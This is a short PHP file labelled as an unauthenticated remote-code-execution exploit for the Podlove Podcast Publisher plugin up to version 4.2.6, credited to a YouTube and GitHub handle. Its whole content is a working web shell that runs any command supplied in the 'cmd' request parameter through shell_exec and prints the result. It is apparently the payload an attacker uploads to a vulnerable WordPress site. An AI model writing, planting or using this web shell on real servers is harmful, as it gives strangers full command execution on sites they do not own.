<?php
/*
youtube : https://www.youtube.com/@Ghostpel-Sec || github : https://github.com/ghostpel-sec/
Podlove Podcast Publisher <= 4.2.6 - Unauthenticated RCE
*/

if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
